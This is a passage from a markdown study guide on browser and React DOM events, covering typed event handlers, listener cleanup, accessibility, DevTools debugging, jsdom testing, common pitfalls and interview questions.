POSITIONING FLOATING UI WITH JS (tooltips, dropdowns, comboboxes):
  1. measure trigger: getBoundingClientRect()          (§14)
  2. measure floating element in useLayoutEffect        (§27)
  3. choose side: flip if it overflows the viewport, shift to stay inside
  4. position: fixed with viewport coords (no scroll math)
  5. update on scroll (capture: true — any ancestor) + resize + ResizeObserver on both
  → This is exactly what Floating UI (@floating-ui/react) does: computePosition,
    autoUpdate, flip(), shift(), offset(). Use it rather than hand-rolling.
```

---

## 32. TypeScript Types for DOM and React Events

```tsx
// ── React synthetic event types (generic = the element the handler is on) ───
function onClick(e: React.MouseEvent<HTMLButtonElement>) {
  e.currentTarget;            // HTMLButtonElement ✅ typed
  e.target;                   // EventTarget ‼️ not typed — could be any child
}
function onChange(e: React.ChangeEvent<HTMLInputElement>) {
  e.target.value;             // string ✅ (for ChangeEvent, target IS typed)
  e.target.checked;
}
function onSelect(e: React.ChangeEvent<HTMLSelectElement>) { e.target.value; }
function onKeyDown(e: React.KeyboardEvent<HTMLInputElement>) { e.key; }
function onSubmit(e: React.FormEvent<HTMLFormElement>) {
  e.preventDefault();
  new FormData(e.currentTarget);
}
function onFocus(e: React.FocusEvent<HTMLDivElement>) { e.relatedTarget; } // Element | null
function onPointer(e: React.PointerEvent<HTMLDivElement>) { e.pointerType; }
function onDrop(e: React.DragEvent<HTMLDivElement>) { e.dataTransfer.files; }
function onWheel(e: React.WheelEvent) { e.deltaY; }
function onPaste(e: React.ClipboardEvent) { e.clipboardData.getData('text'); }

// Handler type shortcuts (for props)
type Props = {
  onClick?: React.MouseEventHandler<HTMLButtonElement>;
  onChange?: React.ChangeEventHandler<HTMLInputElement>;
};
// Accept every native button prop in a wrapper component:
type ButtonProps = React.ComponentProps<'button'> & { variant?: 'primary' | 'ghost' };
```

```ts
// ── Native DOM types ────────────────────────────────────────────────────────
window.addEventListener('keydown', (e) => e.key);        // e inferred: KeyboardEvent ✅
document.addEventListener('pointermove', (e) => e.clientX); // PointerEvent ✅
el.addEventListener('custom', (e) => {});               // Event — custom names aren't known

// ‼️ e.target is EventTarget | null — narrow it before using element APIs
document.addEventListener('click', (e) => {
  if (!(e.target instanceof Element)) return;           // could be a Text node or window
  const row = e.target.closest<HTMLTableRowElement>('tr[data-id]');
  row?.dataset.id;
});

// querySelector returns Element | null — pass a type or a tag selector
const input = document.querySelector<HTMLInputElement>('#email');   // HTMLInputElement | null
const btn = document.querySelector('button');                       // HTMLButtonElement | null (inferred from tag)

// Refs
const inputRef = useRef<HTMLInputElement>(null);   // RefObject<HTMLInputElement | null>
const timerRef = useRef<number>(0);                 // mutable value; use window.setTimeout
                                                    // to get number, not NodeJS.Timeout

// Custom events, typed
declare global {
  interface DocumentEventMap {
    'cart:updated': CustomEvent<{ count: number }>;
  }
}
document.addEventListener('cart:updated', (e) => e.detail.count);   // ✅ typed now

// CSS custom properties in style
<div style={{ '--progress': '40%' } as React.CSSProperties} />
```

---

## 33. Memory Leaks and Cleanup

```text
‼️ EVERYTHING YOU START, YOU MUST STOP

   Started with                         Stop with
   ----------------------------------   ----------------------------------------
   addEventListener                     removeEventListener (same fn, same capture)
                                        or AbortController.abort() via { signal }
   setTimeout / setInterval             clearTimeout / clearInterval
   requestAnimationFrame                cancelAnimationFrame
   ResizeObserver / IntersectionObserver / MutationObserver   .disconnect()
   fetch                                AbortController.abort()
   WebSocket / EventSource              .close()
   matchMedia listener                  mq.removeEventListener('change', fn)
   Third-party widget                   its destroy() / dispose()
   URL.createObjectURL(blob)            URL.revokeObjectURL(url)

   In React all of these go in the effect's cleanup function.

   WHAT A LEAK LOOKS LIKE:
   - A listener on window that closes over a big component's state keeps it alive
     after unmount ("detached DOM tree" in a heap snapshot).
   - Handlers firing twice / more after navigating back and forth.
   - "Can't perform a React state update on an unmounted component" (older React) —
     a timer or request finished after unmount.
```

```jsx
// One AbortController cleans up a fetch and several listeners together
useEffect(() => {
  const ac = new AbortController();
  const { signal } = ac;

  fetch(`/api/tasks/${id}`, { signal })
    .then(r => r.json())
    .then(setTask)
    .catch(err => { if (err.name !== 'AbortError') setError(err); });

  window.addEventListener('online', refetch, { signal });
  document.addEventListener('visibilitychange', onVisibility, { signal });

  return () => ac.abort();   // cancels the request AND removes both listeners
}, [id]);
// Bonus: aborting on id change prevents a slow old response overwriting a newer one
// (race condition).
```

Finding leaks: DevTools Memory → heap snapshot → filter "Detached" ([../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSER-INTERNALS-DEEP.md#memory-leaks--how-they-happen)).

---

## 34. Accessibility You Get or Lose Through Events

```text
‼️ <div onClick> IS NOT A BUTTON

   <button onClick={save}>Save</button> gives you, for free:
     - focusable with Tab
     - Enter and Space trigger click
     - announced as "Save, button" by screen readers
     - disabled works, :focus-visible ring, form submission behaviour

   <div onClick={save}>Save</div> gives you a mouse-only feature. To repair it you'd need
   role="button" tabIndex={0} onKeyDown (Enter + Space, Space on keyup, preventDefault
   to stop scrolling)... just use <button type="button">.

   Navigation → <a href> (open-in-new-tab, copy link, middle-click work).
   Action     → <button>.
```

```text
EVENT-RELATED A11Y CHECKLIST
  - Everything clickable is reachable and operable by keyboard alone
  - Hover-only content (tooltips, menus) also opens on focus, and Escape closes it
  - Don't remove focus outlines without a :focus-visible replacement
  - Return focus to the trigger when a menu/dialog closes
  - Custom widgets follow the ARIA Authoring Practices keyboard patterns
    (arrows inside listbox/menu/tabs, Tab to leave)
  - Don't trap focus except in modals; always provide an exit (Escape)
  - Announce async results: aria-live="polite" region for "Saved", "3 results"
  - Drag and drop has a keyboard / button alternative
  - Respect prefers-reduced-motion for scroll and animation
  - Touch targets at least 24×24 CSS px (44×44 recommended)
```

More: [../3-low-priority/ACCESSIBILITY-MED-DEEP.md](../3-low-priority/ACCESSIBILITY-MED-DEEP.md).

---

## 35. Debugging DOM and Events in DevTools

```text
CHROME DEVTOOLS — the moves worth memorizing

  Elements panel
    $0                          the currently selected element, in the Console
    $$('li.done')               = [...document.querySelectorAll('li.done')]
    "Event Listeners" tab       every listener on the selected node and ancestors.
                                Uncheck "Ancestors" to see only this element.
                                In React apps you'll mostly see React's listeners on #root.
    Right-click → Break on      → subtree modifications / attribute modifications /
                                  node removal: pauses on the JS that changed the DOM.
                                  ‼️ "Who keeps removing my class?" is solved by this.
    :hov button                 force :hover / :focus / :focus-visible / :active state
                                to style hover menus without chasing them with the mouse.

  Console utilities (Chrome; not available in your app code)
    getEventListeners($0)       object of { click: [...], keydown: [...] }
    monitorEvents(window, 'resize')    log every resize event
    monitorEvents($0, ['click', 'focus'])
    unmonitorEvents(window)
    copy(obj)                   copy a value to the clipboard
    inspect(el)                 jump to the element in Elements

  Sources panel
    Event Listener Breakpoints  (right side) pause on ANY click / keydown / scroll /
                                setTimeout fire — find the handler you can't locate.
    Ignore-list node_modules    so stepping skips React internals.

  Performance panel
    record → interact → stop:  long tasks (red corners), "Forced reflow" warnings,
                               which handler was slow. Interactions track shows INP.

  Rendering drawer (⋮ → More tools → Rendering)
    Paint flashing              green flashes = repainted areas
    Layout shift regions        blue = CLS
    Emulate CSS media           prefers-color-scheme, reduced-motion, print
    Emulate a focused page      keep focus/blur behaviour while clicking in DevTools
                                (otherwise opening DevTools blurs your page — dropdowns
                                that close on blur vanish while you inspect them)

  Freeze the page to inspect a menu that closes on blur:
    Sources panel → press F8 (pause) while the menu is open, or in Console:
    setTimeout(() => { debugger; }, 3000)   then open the menu within 3 seconds.

  React DevTools
    Components tab → select component → see props/state/hooks; "<>" jumps to source;
    eye icon → inspect the matching DOM node. Profiler tab → why did this render.
```

---

## 36. Testing DOM Interactions

```text
TEST ENVIRONMENT FACTS (Vitest/Jest + jsdom or happy-dom)

  ‼️ jsdom has NO LAYOUT ENGINE:
     getBoundingClientRect() → all zeros, offsetWidth/clientWidth → 0,
     scrollIntoView → not implemented (undefined), no real scrolling.
  ‼️ Missing APIs you'll need to stub: ResizeObserver, IntersectionObserver,
     matchMedia, HTMLDialogElement.showModal (in older jsdom), PointerEvent details,
     navigator.clipboard (partially).

  Anything that depends on real layout, scroll, focus rings or drag — test it in a
  real browser: Playwright, or Vitest Browser Mode.
```

```ts
// vitest.setup.ts — common stubs
class ResizeObserverStub {
  observe() {} unobserve() {} disconnect() {}
}
globalThis.ResizeObserver ??= ResizeObserverStub as any;
globalThis.IntersectionObserver ??= class {
  observe() {} unobserve() {} disconnect() {} takeRecords() { return []; }
} as any;
window.matchMedia ??= ((query: string) => ({
  matches: false, media: query, onchange: null,
  addEventListener() {}, removeEventListener() {},
  addListener() {}, removeListener() {}, dispatchEvent: () => false,
})) as any;
Element.prototype.scrollIntoView ??= function () {};
```

```tsx
// ‼️ Prefer userEvent over fireEvent: userEvent reproduces the full sequence a real
// user causes (pointerdown → mousedown → focus → pointerup → mouseup → click; keydown →
// beforeinput → input → keyup per character). fireEvent dispatches ONE event, so
// blur-before-click bugs and focus behaviour never show up.
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('closes the menu on Escape and returns focus', async () => {
  const user = userEvent.setup();
  render(<Menu label="Actions" items={items} />);
  const trigger = screen.getByRole('button', { name: 'Actions' });

  await user.click(trigger);
  expect(screen.getByRole('menu')).toBeInTheDocument();

  await user.keyboard('{Escape}');
  expect(screen.queryByRole('menu')).not.toBeInTheDocument();
  expect(trigger).toHaveFocus();
});

test('typing submits on Enter', async () => {
  const user = userEvent.setup();
  const onSend = vi.fn();
  render(<ChatInput onSend={onSend} />);
  await user.type(screen.getByRole('textbox'), 'hello{Enter}');
  expect(onSend).toHaveBeenCalledWith('hello');
});

// Fake timers + userEvent: tell userEvent how to advance them
// const user = userEvent.setup({ advanceTimers: vi.advanceTimersByTime });
```

More: [REACT-TESTING-BASICS.md](REACT-TESTING-BASICS.md).

---

## 37. Common Pitfalls

| Symptom | Cause | Fix |
|---|---|---|
| Listener never removed | Different function reference, or `capture` mismatch | Keep the reference; or `{ signal }` + `abort()` |
| Handler reads old state | Listener created once in `useEffect(..., [])` | Functional update, deps, `useEffectEvent`, latest-ref (§26) |
| Listeners fire twice in dev | StrictMode re-runs effects; cleanup missing | Return a correct cleanup |
| `e.target.dataset.id` undefined | Clicked a child (icon/span) | `e.currentTarget`, or `e.target.closest('[data-id]')` |
| `e.currentTarget` is null | Read after `await` / later | Save it to a variable first |
| Form reloads the page | No `preventDefault` in submit | `e.preventDefault()` in `onSubmit` |
| "Cancel" button submits the form | `<button>` defaults to `type="submit"` | `type="button"` |
| Clicking a dropdown option does nothing | Input blur closes the menu before click (§12) | `onMouseDown={e => e.preventDefault()}` on options |
| Enter submits half-typed Chinese/Japanese | IME composition | Ignore when `isComposing` / `keyCode === 229` (§11) |
| `preventDefault` on wheel/touch ignored + warning | Passive listener (browser default / React) | Native listener with `{ passive: false }` (§9) |
| `onClick` in React suddenly never fires | A native listener inside called `stopPropagation` | Find it via Event Listeners panel; avoid stopPropagation |
| Click-outside closes on clicks inside a submenu | Submenu is in a portal, not inside the container DOM | Include portal ref in the check (§28) |
| Sizes are 0 | Element is `display:none`, not mounted yet, or in jsdom | Measure in `useLayoutEffect` after render; test in a real browser |
| Tooltip flickers into place | Measured in `useEffect` (after paint) | `useLayoutEffect` (§27) |
| Page is janky while scrolling | Heavy scroll handler, layout read/write mix | rAF-throttle, passive, IntersectionObserver, CSS (§15, §18) |
| `scrollIntoView` moves the whole page | It scrolls all ancestors | `block: 'nearest'`, or set `container.scrollTop` |
| Element scroll not seen by parent's `onScroll` | Scroll doesn't bubble | Attach to the scrolling element; or capture listener |
| Debounce doesn't debounce in React | New debounced function each render | `useMemo`/`useRef`, or debounce the value (§20) |
| `window is not defined` | Browser API used during SSR render | Move into `useEffect`; `useSyncExternalStore` server snapshot (§29) |
| Hydration mismatch | Render reads `window`, `localStorage`, `Date.now()` | Stable default + update after mount (§29) |
| `removeChild` / `insertBefore` errors in React | Something else mutated React's DOM (you, an extension, Google Translate) | Don't mutate React-owned nodes; give libraries their own empty container |
| `setAttribute('disabled', 'false')` still disabled | Boolean attribute presence | `el.disabled = false` / `removeAttribute` |
| Typed value lost when setting `input.value` from JS | No event fired; React state not updated | Change React state instead |
| Cmd+click on your links doesn't open new tab | `preventDefault` on all clicks | Skip when modifier keys / non-left button (§10) |
| Drop never fires | No `preventDefault` in `dragover` | Add it (§23) |
| `getData()` empty during dragover | Privacy rule — only readable on drop | Use `dataTransfer.types` until drop |
| Touch drag cancels after a few px | Browser took over scrolling → `pointercancel` | `touch-action: none` on the handle (§10) |
| Hover style "sticks" after tap on phone | Emulated mouseover on touch | `@media (hover: hover)` around hover styles |
| `navigator.clipboard` undefined | Not HTTPS / not in a user gesture | Serve over HTTPS; call from the click handler |
| Dialog content clickable behind modal | Using a div overlay without inert | `<dialog>.showModal()` (§31) |

---

## 38. Interview Questions

### "Explain event bubbling, capturing, and delegation."

Events travel in three phases: capture (window down to the target), target, and bubble (back up to window). Normal listeners run in the bubble phase; `{ capture: true }` runs them on the way down. Delegation uses bubbling: one listener on a parent handles events for all children, current and future, by checking `e.target.closest(selector)`. It saves memory, handles dynamic content, and is how React itself attaches events — one listener per event type on the root container.

### "What's the difference between `e.target` and `e.currentTarget`?"

`target` is the innermost element where the event started (possibly an icon inside the button). `currentTarget` is the element whose listener is currently running. Read your own data from `currentTarget`; use `target` with `closest()` in delegation. `currentTarget` is only valid while the handler runs.

### "preventDefault vs stopPropagation?"

`preventDefault` cancels the browser's default action (navigate, submit, check, scroll, focus-on-mousedown) but the event keeps propagating. `stopPropagation` stops the event reaching further elements but the default action still happens. They're independent; you can call either, both, or neither.

### "How does React's event system differ from native events?"

React attaches one listener per event type at the root and dispatches `SyntheticEvent`s through the component tree. Differences: `onChange` is the native `input` event; `onFocus`/`onBlur` bubble (focusin/focusout); events from portals bubble through the React tree, not the DOM tree; wheel/touchstart/touchmove are passive; returning `false` doesn't prevent default; event pooling was removed in 17. Native listeners on inner elements run before React handlers.

### "What are passive event listeners and why do they exist?"

A passive listener promises not to call `preventDefault`. For `touchstart`/`touchmove`/`wheel`, the browser would otherwise have to wait for your JS before it scrolls, in case you cancel it — causing scroll jank. With passive it can scroll immediately on the compositor thread. Browsers default these to passive on window/document/body; you opt out with `{ passive: false }` only when you really cancel scrolling.

### "What is layout thrashing and how do you avoid it?"

Interleaving DOM writes with layout reads (`offsetHeight`, `getBoundingClientRect`) forces the browser to recompute layout synchronously each time. Batch all reads, then all writes; defer writes to `requestAnimationFrame`; animate `transform`/`opacity`; use observers instead of measuring in scroll handlers.

### "`clientWidth` vs `offsetWidth` vs `scrollWidth` vs `getBoundingClientRect()`?"

`clientWidth`: padding + content, no border or scrollbar. `offsetWidth`: border-box including scrollbar, ignores transforms. `scrollWidth`: full content width including overflow. `getBoundingClientRect()`: rendered box after transforms, fractional, with position relative to the viewport.

### "How do you detect an element entering the viewport? Why not a scroll listener?"

`IntersectionObserver`. It's asynchronous and computed by the browser, so it doesn't run on every scroll frame or force layout, works for any scroll container via `root`, and supports pre-loading with `rootMargin`. A scroll listener runs constantly and must call `getBoundingClientRect` (layout) each time.

### "`useEffect` vs `useLayoutEffect`?"

Both run after React commits the DOM. `useLayoutEffect` runs synchronously before the browser paints — use it to measure and adjust layout without flicker (tooltips, scroll restoration). `useEffect` runs after paint and doesn't block it — the default for everything else. `useLayoutEffect` doesn't run on the server.

### "Implement click-outside. What edge cases matter?"

Listen on `document` for `pointerdown` (capture phase), check `!ref.current.contains(e.target)`. Edge cases: include the trigger so it doesn't close-and-reopen; portal content isn't in the container's DOM; touch devices; inner `stopPropagation` (capture solves it); stale callback (latest-ref); remove the listener on unmount or when closed; iframes don't send events to the parent document (listen for window `blur` too).

### "Why does my dropdown close before the option's click registers?"

`mousedown` on the option moves focus, so the input blurs first; if `onBlur` closes the menu, the option unmounts before `click`. Fix with `preventDefault` on the option's `mousedown`, select on `pointerdown`, or check `relatedTarget` in the blur handler.

### "How do you handle keyboard shortcuts correctly?"

`keydown` on `document`; compare `e.key` (meaning) for letters and `e.code` for position-based keys; Cmd on Mac / Ctrl elsewhere; ignore when the user is typing in a field, except for modifier combos; ignore during IME composition; `preventDefault` to override browser shortcuts; clean up on unmount.

### "What happens between typing a URL and `DOMContentLoaded` / `load`?"

HTML is parsed; classic scripts block parsing; `defer`/module scripts run after parsing; then `DOMContentLoaded` fires (DOM ready). Images, stylesheets, iframes finish → `load`. For leaving: prefer `visibilitychange`/`pagehide` over `unload`, and `sendBeacon`/`keepalive` for final requests.

### "How would you make a resizable panel?"

`pointerdown` on the handle → `setPointerCapture` → track `pointermove` deltas from `clientX` → set width (rAF-throttled) → clean up on `pointerup`/`pointercancel`. `touch-action: none` on the handle, `user-select: none` while dragging, min/max clamps, keyboard support (arrow keys adjust width, `role="separator"` with `aria-valuenow`).

---

## Related Files

- [JAVASCRIPT-DEEP.md](JAVASCRIPT-DEEP.md) — event loop, closures, `this`; short delegation/bubbling Q&A
- [JS-INTERVIEW-LIVE-CODING.md](JS-INTERVIEW-LIVE-CODING.md) — debounce, throttle, EventEmitter implementations
- [REACT-DEEP.md](REACT-DEEP.md) and [SENIOR-FRONTEND-DAILY-DEEP.md](SENIOR-FRONTEND-DAILY-DEEP.md) — hooks, effects, refs in depth
- [REACT-TESTING-BASICS.md](REACT-TESTING-BASICS.md) — userEvent, queries, mocks (§36)
- [../2-medium-priority/WEB-APIS-DEEP.md](../2-medium-priority/WEB-APIS-DEEP.md) — observers, workers, clipboard, BroadcastChannel, Page Visibility in depth
- [../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSER-INTERNALS-DEEP.md) — rendering pipeline, memory leaks, GC
- [../2-medium-priority/BROWSER-COMPATIBILITY-DEEP.md](../2-medium-priority/BROWSER-COMPATIBILITY-DEEP.md) — Safari/mobile event quirks, viewport and keyboard, bfcache
- [../2-medium-priority/PERFORMANCE-DEEP.md](../2-medium-priority/PERFORMANCE-DEEP.md) — INP, long tasks, rendering cost
- [../2-medium-priority/CSS-DEEP.md](../2-medium-priority/CSS-DEEP.md) — layout, positioning, container queries
- [../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md](../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md) — XSS via innerHTML, postMessage origin checks
- [../2-medium-priority/NEXTJS-DEEP.md](../2-medium-priority/NEXTJS-DEEP.md) — SSR, hydration, client components (§29)
- [../3-low-priority/ACCESSIBILITY-MED-DEEP.md](../3-low-priority/ACCESSIBILITY-MED-DEEP.md) — keyboard patterns, focus management, ARIA (§34)
